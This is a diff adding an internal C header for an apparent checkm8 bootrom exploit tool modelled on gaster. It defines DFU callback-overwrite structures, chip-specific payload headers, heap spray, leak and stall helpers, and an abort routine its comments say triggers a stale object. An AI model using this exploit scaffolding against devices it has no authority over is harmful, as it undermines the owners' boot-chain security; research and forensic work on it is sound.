@@ -1,0 +1,279 @@
+/* checkm8_internal.h -- Shared constants, types, and helpers for checkm8 */
+
+#ifndef CHECKM8_INTERNAL_H
+#define CHECKM8_INTERNAL_H
+
+#include <stdint.h>
+#include "dfu/dfu_handler.h"
+
+/* ------------------------------------------------------------------ */
+/* Magic constants from gaster                                         */
+/* ------------------------------------------------------------------ */
+
+#define EXEC_MAGIC  0x6578656365786563ULL  /* "execexec" */
+#define MEMC_MAGIC  0x6D656D636D656D63ULL  /* "memcmemc" */
+#define DONE_MAGIC  0x646F6E65646F6E65ULL  /* "donedone" */
+
+/* ------------------------------------------------------------------ */
+/* DFU transfer constants                                              */
+/* ------------------------------------------------------------------ */
+
+#define DFU_FILE_SUFFIX_LEN  16
+#define DFU_MAX_TRANSFER_SZ  0x800
+#define EP0_MAX_PACKET_SZ    0x40
+
+/* ------------------------------------------------------------------ */
+/* Stage tuning parameters                                           */
+/* ------------------------------------------------------------------ */
+
+#define MAX_DFU_TRIES          3
+#define STAGE_DELAY_USEC           10000    /* 10 ms */
+#define USB_RECONNECT_DELAY_USEC   8000000  /* 8 s: device reboot after stage */
+#define STALL_TIMEOUT_MS           1        /* 1 ms async stall */
+#define USB_TIMEOUT_MS             5000
+
+/* USB timeout for abort-based async transfers (matches gaster default) */
+#define USB_ABORT_TIMEOUT_DEFAULT   5
+#define USB_ABORT_TIMEOUT_MIN       0
+
+/*
+ * USB_MAX_STRING_DESCRIPTOR_IDX (10) is used as wIndex in GET_DESCRIPTOR
+ * requests to trigger the string descriptor allocation path.  The DFU
+ * serial descriptor index itself is no longer a compile-time constant
+ * -- it is read at runtime from bDeviceDescriptor.iSerialNumber and
+ * threaded through the spray helpers by their caller.
+ */
+#define USB_MAX_STRING_DESC_IDX     10
+
+/* ------------------------------------------------------------------ */
+/* CPID classification helpers                                         */
+/* ------------------------------------------------------------------ */
+
+/*
+ * CPID_IS_ARMV7 -- 32-bit ARMv7 chips (payload_dest_armv7 != 0).
+ * 0x8947 (A7, iPhone 5s) is included here: despite being Apple's first
+ * ARM64 SoC, gaster's DFU stage path uses payload_dest_armv7 and the
+ * notA9_armv7 payload header for this chip, identical to the other
+ * 32-bit chips.  It is NOT in the notA9 ARM64 branch in gaster.
+ */
+#define CPID_IS_ARMV7(cpid) \
+    ((cpid) == 0x8947 || (cpid) == 0x7002 || (cpid) == 0x8002 || \
+     (cpid) == 0x8004 || (cpid) == 0x8950 || (cpid) == 0x8955)
+
+/*
+ * CPID_IS_LEGACY_64 -- ARM64 chips that use payload_hdr_a9_t (the simpler
+ * 64-bit header without redirect addresses or tlbi).  Previously this included
+ * 0x8947 (A7), but gaster treats A7 as ARMv7 (payload_dest_armv7 path),
+ * so this macro is currently unused; kept for future use.
+ */
+#define CPID_IS_LEGACY_64(cpid) \
+    (0)
+
+/* Chips with redirect addresses (tlbi != 0 means newer overwrite path) */
+#define CPID_HAS_TLBI(chip)  ((chip)->tlbi != 0)
+
+/* ------------------------------------------------------------------ */
+/* DFU callback overwrite structures (from gaster)                     */
+/* ------------------------------------------------------------------ */
+
+/* 64-bit ARM64 DFU callback */
+typedef struct {
+    uint32_t endpoint;
+    uint32_t pad_0;
+    uint64_t io_buffer;
+    uint32_t status;
+    uint32_t io_len;
+    uint32_t ret_cnt;
+    uint32_t pad_1;
+    uint64_t callback;
+    uint64_t next;
+} dfu_callback_t;
+
+/* 32-bit ARMv7 DFU callback */
+typedef struct {
+    uint32_t endpoint;
+    uint32_t io_buffer;
+    uint32_t status;
+    uint32_t io_len;
+    uint32_t ret_cnt;
+    uint32_t callback;
+    uint32_t next;
+} dfu_callback_armv7_t;
+
+/* Overwrite payload wrapper */
+typedef struct {
+    dfu_callback_t callback;
+} checkm8_overwrite_t;
+
+/* ------------------------------------------------------------------ */
+/* Payload header structures (chip-specific, prepended to stage4 code)    */
+/* ------------------------------------------------------------------ */
+
+/* ARM64 payload header for A9-class chips (with TTBR0 modification) */
+typedef struct {
+    uint64_t insecure_memory_base;
+    uint64_t patch_addr;
+    uint64_t memcpy_addr;
+    uint64_t aes_crypto_cmd;
+    uint64_t boot_tramp_end;
+    uint64_t gUSBSerialNumber;
+    uint64_t dfu_handle_request;
+    uint64_t usb_core_do_transfer;
+    uint64_t dfu_handle_bus_reset;
+    uint64_t handle_interface_request;
+    uint64_t usb_create_string_descriptor;
+    uint64_t usb_serial_number_string_descriptor;
+    uint64_t ttbr0_addr;
+    uint64_t ttbr0_vrom_off;
+} payload_hdr_a9_t;
+
+/* ARM64 payload header for A10+ chips (with redirect addresses) */
+typedef struct {
+    uint64_t insecure_memory_base;
+    uint64_t patch_addr;
+    uint64_t memcpy_addr;
+    uint64_t aes_crypto_cmd;
+    uint64_t boot_tramp_end;
+    uint64_t gUSBSerialNumber;
+    uint64_t dfu_handle_request;
+    uint64_t usb_core_do_transfer;
+    uint64_t dfu_handle_bus_reset;
+    uint64_t handle_interface_request;
+    uint64_t usb_create_string_descriptor;
+    uint64_t usb_serial_number_string_descriptor;
+    uint64_t ttbr0_addr;
+    uint64_t tlbi;
+    uint64_t nop_addr;
+    uint64_t ret_addr;
+    uint64_t func_addr;
+    uint64_t write_ttbr0;
+    uint64_t ttbr0_vrom_off;
+    uint64_t ttbr0_sram_off;
+} payload_hdr_notA9_t;
+
+/* ARMv7 payload header for 32-bit chips */
+typedef struct {
+    uint32_t insecure_memory_base;
+    uint32_t payload_dest;
+    uint32_t memcpy_addr;
+    uint32_t aes_crypto_cmd;
+    uint32_t gUSBSerialNumber;
+    uint32_t dfu_handle_request;
+    uint32_t usb_core_do_transfer;
+    uint32_t dfu_handle_bus_reset;
+    uint32_t handle_interface_request;
+    uint32_t usb_create_string_descriptor;
+    uint32_t usb_serial_number_string_descriptor;
+} payload_hdr_armv7_t;
+
+/* ------------------------------------------------------------------ */
+/* Internal API                                                        */
+/* ------------------------------------------------------------------ */
+
+/*
+ * assemble_payload -- Build the stage payload (header + stage4 code)
+ * for the given context's chip. Allocates ctx->payload_buf.
+ * Returns 0 on success, -1 on failure.
+ */
+int assemble_payload(dfu_ctx_t *ctx);
+
+/*
+ * usb_ctrl_transfer_async -- Send a control transfer with a short
+ * timeout, ignoring timeout errors. Used for stall-based allocation.
+ * Returns 0 on success or timeout, -1 on hard failure.
+ */
+int usb_ctrl_transfer_async(libusb_device_handle *dev,
+                            uint8_t bmRequestType,
+                            uint8_t bRequest,
+                            uint16_t wValue,
+                            uint16_t wIndex,
+                            unsigned char *data,
+                            uint16_t wLength,
+                            unsigned int timeout_ms);
+
+/*
+ * usb_ctrl_transfer_async_ret -- Send a control transfer with a short
+ * timeout, returning the number of bytes actually transferred (or -1
+ * on hard failure, 0 on timeout). Used for abort-based setup.
+ */
+int usb_ctrl_transfer_async_ret(libusb_device_handle *dev,
+                                uint8_t bmRequestType,
+                                uint8_t bRequest,
+                                uint16_t wValue,
+                                uint16_t wIndex,
+                                unsigned char *data,
+                                uint16_t wLength,
+                                unsigned int timeout_ms);
+
+/*
+ * Raw control transfer helpers for stage timing-critical requests.
+ * Unlike util/usb_helpers.c these do not retry PIPE/STALL responses,
+ * because those responses are part of checkm8's signaling path.
+ */
+int usb_ctrl_transfer_raw(libusb_device_handle *dev,
+                          uint8_t bmRequestType,
+                          uint8_t bRequest,
+                          uint16_t wValue,
+                          uint16_t wIndex,
+                          unsigned char *data,
+                          uint16_t wLength,
+                          unsigned int timeout_ms);
+
+int usb_ctrl_transfer_no_data_raw(libusb_device_handle *dev,
+                                  uint8_t bmRequestType,
+                                  uint8_t bRequest,
+                                  uint16_t wValue,
+                                  uint16_t wIndex,
+                                  unsigned int timeout_ms);
+
+/*
+ * usb_ctrl_transfer_dnload_abort -- Async DFU_DNLOAD with proper cancel.
+ *
+ * Used only by checkm8_stage_setup (stage 2) to trigger the stale object.
+ * Submits an async transfer, waits abort_ms, then calls cancel_transfer.
+ * The transfer has a 200ms hard timeout so it always completes cleanly.
+ * Returns 0 if aborted (stale object condition), >0 if STATUS received first, -1 on error.
+ */
+int usb_ctrl_transfer_dnload_abort(libusb_device_handle *dev,
+                                   uint8_t bmRequestType,
+                                   uint8_t bRequest,
+                                   uint16_t wValue,
+                                   uint16_t wIndex,
+                                   unsigned char *data,
+                                   uint16_t wLength,
+                                   unsigned int abort_ms);
+
+/* ------------------------------------------------------------------ */
+/* Spray helpers (checkm8_spray.c)                                     */
+/* ------------------------------------------------------------------ */
+
+/*
+ * checkm8_usb_request_stall -- Send a SET_FEATURE to EP0x80 to provoke
+ * a STALL. Returns 1 if the device STALLed, 0 otherwise.
+ */
+int checkm8_usb_request_stall(libusb_device_handle *usb);
+
+/*
+ * checkm8_usb_request_leak -- Async GET_DESCRIPTOR with 1ms timeout
+ * and EP0_MAX_PACKET_SZ length. Returns 1 if sz==0, 0 otherwise.
+ * `iserial_idx` is the descriptor index that populates the low byte
+ * of wValue -- the caller reads it from bDeviceDescriptor.iSerialNumber
+ * (via device_info_t::iserial_index) rather than assuming a constant.
+ */
+int checkm8_usb_request_leak(libusb_device_handle *usb, uint8_t iserial_idx);
+
+/*
+ * checkm8_stall -- Repeatedly send GET_DESCRIPTOR with variable abort
+ * timeout until the device responds with a short transfer and a
+ * successful leak request. Matches gaster's checkm8_stall().
+ * Returns 0 on success, -1 if MAX_STALL_RETRIES is exceeded.
+ */
+int checkm8_stall(libusb_device_handle *usb, uint8_t iserial_idx);
+
+/*
+ * checkm8_no_leak -- Async GET_DESCRIPTOR with 1ms timeout and
+ * (3*EP0_MAX_PACKET_SZ + 1) length. Returns 1 if sz==0, 0 otherwise.
+ */
+int checkm8_no_leak(libusb_device_handle *usb, uint8_t iserial_idx);
+
+#endif /* CHECKM8_INTERNAL_H */
